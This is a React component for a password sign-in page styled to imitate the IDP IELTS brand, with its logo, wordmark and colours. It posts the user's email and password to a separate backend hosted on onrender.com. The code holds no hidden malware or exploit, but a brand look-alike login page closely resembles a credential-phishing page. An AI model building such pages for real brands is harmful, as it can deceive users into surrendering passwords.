import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { EyeIcon, EyeOffIcon, ArrowLeft } from 'lucide-react';

export default function PasswordPage() {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const email = localStorage.getItem('email');

  const handleLogin = async () => {
    setLoading(true); // Start loading animation

    try {
      const res = await fetch('https://ieltsbackend-r6p1.onrender.com/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await res.json();

      if (data.success) {
        localStorage.setItem('name', data.name);
        navigate('/DBash');
      } else {
        // Using a custom alert for better UX than browser's default alert()
        alert('Invalid credentials'); // Keeping alert for now as per previous instructions
      }
    } catch (error) {
      console.error("Login failed:", error);
      alert('An error occurred during login. Please try again.'); // Keeping alert for now
    } finally {
      setLoading(false); // Stop loading animation regardless of success or failure
    }
  };

  const handleBack = () => {
    navigate(-1); // Go back to the previous page
  };

  return (
    <div className="min-h-screen bg-white font-sans antialiased relative overflow-hidden"> {/* Added overflow-hidden to prevent scrollbar during blur */}
      {/* Main content container - this entire div will be blurred */}
      <div className={`relative z-10 ${loading ? 'filter blur-sm pointer-events-none' : ''} transition-all duration-300 ease-in-out h-full`}>
        {/* Topmost thin red bar */}
        <div className="absolute top-0 left-0 w-full h-[7px] bg-[#E20000] z-30" />

        {/* Large Curved Red Background Shape (Behind the header) */}
        <div
          className="absolute top-0 left-0 w-[300px] h-[100px] bg-gradient-to-br from-[#E20000] to-[#C00000] transform -skew-x-[15deg] origin-top-left -translate-x-[10%] -translate-y-[5%] rounded-br-[70px] z-10"
          style={{
            backgroundPosition: 'left top',
            filter: 'drop-shadow(0 0 5px rgba(226, 0, 68, 0.88))'
          }}
        />

        {/* Main Header/Navbar Card */}
        <header className="fixed top-[7px] left-0 w-full bg-white transition-shadow duration-200 z-50 shadow-sm">
          <div className="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 py-3 flex justify-between items-center relative">
            {/* Logo - Updated SVG to resemble idp IELTS from pipl.JPG */}
             <div className="flex items-center space-x-1 sm:space-x-2">
      {/* This is a placeholder image for the first logo.
        In a real application, you would replace this with the actual image path,
        e.g., src="/src/assets/IDP.png" or a similar logo.
      */}
      <img
        src="/IDP.png"
        alt="IDP Logo"
        className="w-24 h-auto sm:w-28" // Maintain responsive sizing
      />
        <svg
        className="w-24 h-auto sm:w-28" // This size now matches the IDP logo
        version="1.0" xmlns="http://www.w3.org/2000/svg"
        viewBox="0 0 74.000000 26.000000"
        preserveAspectRatio="xMidYMid meet"
      >
        <g transform="translate(0.000000,26.000000) scale(0.100000,-0.100000)"
          fill="#E20000" stroke="none">
          <path d="M593 229 c-28 -10 -46 -44 -38 -70 4 -13 29 -30 61 -45 60 -26 67
          -40 27 -50 -21 -6 -30 -2 -41 14 -18 27 -52 29 -52 4 0 -30 33 -52 76 -52 52
          0 84 23 84 59 0 34 -13 46 -66 63 -22 7 -39 20 -39 28 0 21 29 24 48 5 17 -16
          57 -21 57 -6 0 5 -8 18 -17 30 -20 23 -67 33 -100 20z"/>
          <path d="M28 130 c3 -98 4 -100 28 -100 24 0 24 1 24 100 l0 100 -27 0 -28 0
          3 -100z"/>
          <path d="M100 130 l0 -100 75 0 c68 0 75 2 75 20 0 17 -7 20 -50 20 -47 0 -50
          1 -50 26 0 25 2 26 50 22 42 -2 50 0 50 15 0 14 -9 17 -49 17 -40 0 -50 3 -54
          20 -5 18 0 20 49 20 47 0 54 2 54 20 0 18 -7 20 -75 20 l-75 0 0 -100z"/>
          <path d="M270 130 l0 -100 75 0 c68 0 75 2 75 20 0 17 -7 20 -51 20 l-51 0 4
          80 3 80 -27 0 -28 0 0 -100z"/>
          <path d="M380 210 c0 -16 7 -20 30 -20 l30 0 0 -80 c0 -79 0 -80 25 -80 25 0
          25 1 25 84 0 82 0 83 24 79 17 -4 25 0 29 16 5 20 1 21 -79 21 -77 0 -84 -2
          -84 -20z"/>
        </g>
      </svg>
            </div>
          </div>
        </header>

        {/* Placeholder to push content down below the fixed header */}
        <div className="pt-[70px]"></div>

        {/* Main Content Area - White card with specific login elements */}
        <div className="max-w-md mx-auto bg-white mt-16 shadow-lg rounded-lg relative overflow-hidden px-8 py-10 sm:px-12 sm:py-14">
          {/* Subtle Radial Background Pattern */}
          <div
            className="absolute inset-0 bg-no-repeat pointer-events-none z-0"
            style={{
              backgroundImage: `url("data:image/svg+xml,%3Csvg width='700' height='700' viewBox='0 0 700 700' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='350' cy='350' r='340' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='300' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='260' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='220' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='180' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='140' stroke='%23E8E8E8' stroke-width='1'/%3E%3Ccircle cx='350' cy='350' r='100' stroke='%23E8E8E8' stroke-width='1'/%3E%3C/svg%3E")`,
              backgroundSize: '700px',
              backgroundPosition: '-180px 100px',
              opacity: 0.35,
            }}
          />

          <div className="relative z-10">
            <button
              onClick={handleBack}
              className="flex items-center text-blue-600 hover:text-blue-800 text-sm font-semibold mb-6"
            >
              <ArrowLeft className="w-4 h-4 mr-1" /> Back
            </button>

            <h2 className="text-2xl font-bold text-gray-800 mb-6">Welcome back</h2>
            <p className="text-gray-600 text-base mb-6">
              Please enter your password to sign in
            </p>

            <div className="relative mb-4">
              <input
                type={showPassword ? 'text' : 'password'}
                className="w-full p-3 pr-10 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={(e) => {
                  if (e.key === 'Enter') {
                    handleLogin();
                  }
                }}
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-500"
              >
                {showPassword ? <EyeOffIcon className="h-5 w-5" /> : <EyeIcon className="h-5 w-5" />}
              </button>
            </div>

            <a href="#" className="text-blue-600 text-sm font-semibold hover:underline block text-right mb-6">
              Forgot password?
            </a>

            <button
              onClick={handleLogin}
              className="w-full bg-[#E20000] text-white py-3 rounded-md font-semibold text-lg hover:bg-[#c00000] transition-colors duration-200"
              disabled={loading}
            >
              Sign in
            </button>
          </div>
        </div>
      </div>

      {/* Loading Overlay with Spinner */}
      {loading && (
        <div className="fixed inset-0  bg-opacity-50 flex items-center justify-center z-50">
          <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-[#E20000]"></div>
        </div>
      )}
    </div>
  );
}
